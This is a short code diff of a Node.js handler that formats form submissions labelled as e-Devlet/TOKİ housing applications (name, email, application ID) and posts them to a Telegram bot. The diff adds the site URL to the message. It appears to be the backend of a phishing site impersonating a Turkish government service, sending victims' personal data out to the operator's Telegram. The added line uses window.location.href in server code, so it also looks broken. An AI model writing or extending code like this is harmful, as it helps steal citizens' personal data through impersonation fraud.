@@ -122,7 +122,6 @@ module.exports = async (req, res) => {
             }
         }
 
-
         // Telegram'a gönderilecek mesaj (yeni format)
         const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n\n
 *👤 Ad Soyad:* ${name}
@@ -136,6 +135,7 @@ module.exports = async (req, res) => {
 *📧 E-posta:* ${email}
 *🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}
 \n\n
+*🔗 Site:* ${window.location.href}
 *📅 Tarih:* ${formatDate(new Date())}`;
 
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
